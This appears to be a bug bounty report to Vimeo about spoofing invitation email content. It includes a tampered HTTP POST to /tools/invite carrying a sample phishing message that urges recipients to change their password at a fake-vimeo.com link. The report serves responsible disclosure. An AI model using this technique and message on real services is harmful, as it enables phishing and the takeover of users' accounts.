## Original Report

Hello Vimeo Security Team, 

I just found issue on vimeo.com/tools/invite that may put our vimeo users in riks and here is the details.

###Problem:
All Email Content Spoofing

###How to reproduce:
1- Go to user settings and change the username to be something like this "Urgent From Vimeo Security Team".
2- Go to vimeo.com/tools/invite to invite a user and you can intercept the request to change it to be like this:

POST /tools/invite HTTP/1.1
Host: vimeo.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate

email_0=dia2diab%40yandex.com&message=This is Urgent event from vimeo security team, out web site has been hacked from bad guys, to be safe please visit this page http://fake-vimeo.com and change your password....Thank you our clients&send_invite=Send+This+Invite&token=d47046ffac2d14e4a406fd64cf6c6994.20fe1a8cf2bf627517050c395e09eb54

and as you can see you can change the message of the content of invitation email and you can put another links out of vimeo.com

###Impacts:
Because users trust in your services, and the victim will get this email like the attached ScreenShot from "no-reply@vimeo.com", he will interact with it and this lead attacker to take over vimeo users accounts.

Attacker can change two things now:
1- email title using his username.
2- email content.

Thank you
